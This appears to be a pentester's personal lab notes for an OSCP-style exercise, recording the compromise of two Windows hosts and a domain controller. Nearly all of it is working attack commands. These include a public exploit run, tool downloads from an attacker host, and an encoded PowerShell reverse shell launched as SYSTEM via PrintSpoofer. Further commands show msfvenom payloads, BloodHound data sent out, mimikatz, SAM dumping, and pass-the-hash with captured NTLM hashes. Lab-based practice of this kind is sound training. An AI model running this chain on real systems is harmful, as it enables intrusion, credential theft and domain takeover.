
| Endpoint | IP              |
| -------- | --------------- |
| MS01     | 192.168.140.141 |
| MS02     | 10.10.100.142   |

| Login         | Password                         | Role |
| ------------- | -------------------------------- | ---- |
| Eric.Wallows  | EricLikesRunning800              |      |
| Mary.Williams |                                  |      |
| support       |                                  |      |
| Paul.Smith    |                                  |      |
| Nate.Reynolds |                                  |      |
| Celia.Almeda  | e728ecbadfb02f51ce8eed753f3ff3fd |      |
| Tom.Kinney    |                                  | IT   |


```bash

# Starting with MSO1

# Enumeration
sudo nmap -sV -sC -v 192.168.140.141 -o nmap.txt
	# 22: SSH
	# 139, 445: SMB
	# HTTP: 
		# 80 - NicePage 4.8.2
		# 81 - Apache httpd 2.4.51
		# 5985
	# MYSQL: 3306
	# 135: RPC (?)

# Enum SMB
nxc smb 192.168.140.141 -u "Eric.Wallows" -p "EricLikesRunning800" --users
```
![[Pasted image 20250323132329.png]]
```bash
# Checking if default accounts can access
nxc smb 192.168.140.141 -u "guest" -p "" --shares # Disabled
nxc smb 192.168.140.141 -u "" -p "" --shares # Doesn't work

# Checking SMB
smbclient -N //192.168.140.141/setup -U Eric.Wallows --password=EricLikesRunning800
smbclient -L 192.168.140.141/setup -U Eric.Wallows --password=EricLikesRunning800
	# Logon failures - stopping for now

# Web server
gobuster dir -u http://192.168.140.141:81 -w /usr/share/wordlists/dirb/common.txt

# Editing the edit to use /admin
python3 50801.py http://192.168.140.141:81
	# Worked!

# Situational awareness
whoami /priv
	# SeImpersonatePrivilege!
```
![[Pasted image 20250323133901 1.png]]

```bash
# Downloading relevant files
powershell wget -uri http://192.168.45.208:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
powershell wget -uri http://192.168.45.208:8000/nc.exe -Outfile nc.exe
powershell wget -uri http://192.168.45.208:8000/wp.exe -Outfile wp.exe
powershell wget -uri http://192.168.45.208:8000/mimikatz.exe -Outfile mimi.exe
powershell -Command "iwr -uri http://192.168.45.208:8000/mi.exe -outfile jaja.exe"
iwr -uri http://192.168.45.208:8000/mi.exe -outfile jaja.exe
iwr -uri http://192.168.45.208:8000/winPEASx86.exe -outfile winPEASx86.exe
iwr -uri http://192.168.45.208:8000/SharpHound.exe -outfile SharpHound.exe

powershell -Command "iwr -uri http://192.168.45.208:8000/mi.exe -outfile mi.exe"
# Running a SYSTEM reverse shell
.\PrintSpoofer64.exe -i -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="


# We are SYSTEM!

# tree /F

# Locating the flag
gci -recurse -filter "flag.txt"
gci -recurse -filter "user.txt"
gci -recurse -filter "root.txt"
gci -recurse -filter "local.txt"
gci -recurse -filter "proof.txt"
	# Can't find anything, dead-end

# Running SharpHound
iwr -uri http://192.168.45.208:8000/SharpHound.exe -outfile SharpHound.exels
.\SharpHound.exe -c All
	# Finding domain admin: tom_admin and Administrator

# Sending the file over
Invoke-RestMethod -Uri http://192.168.45.208/20250323064145_BloodHound.zip -Method PUT -InFile 20250323064145_BloodHound.zip

# Setting up Ligolo
./proxy -selfcert # On Kali
iwr -uri http://192.168.45.208:8000/agent.exe -outfile agent.exe
./agent.exe -connect 192.168.45.208:11601 -ignore-cert
	# Routing works!

# Stabilize shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.238 LPORT=4445 -f exe > reverse.exe
iwr -uri http://192.168.45.208:8000/mimikatz.exe -outfile reverse.exe
iwr -uri http://192.168.45.208:8000/mimikatz.exe -outfile mimikatz.exe
	# Shell stabilized
# Mimikatz works!

# Found NTLM hash for user celia.almeda who is in the domain OSCP
e728ecbadfb02f51ce8eed753f3ff3fd

```
![[Pasted image 20250323151621.png]]

```bash
# PtH to connect to MS02
evil-winrm -i 10.10.100.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
	# Connection successful!
```

![[Pasted image 20250323152020.png]]

```bash
# SAM and SYSTEM are dumped from C:\windows.old\Windows\System32 (backup system)
```
![[Pasted image 20250323152538.png]]

```bash
# Retrieve SAM and SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Found tom_admin's password
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::

# Trying to use our newly obtained credentials on all the endpoints in the domain
nxc winrm 10.10.100.0/24 -u "tom_admin" -H "4979d69d4ca66955c075c41cf45f24dc"
nxc winrm 10.10.100.141 -u "tom_admin" -H "4979d69d4ca66955c075c41cf45f24dc"

# Connect to DC using tom_admin
evil-winrm -i 10.10.100.140 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'

# Flag found ;)
```
![[Pasted image 20250323154729.png]]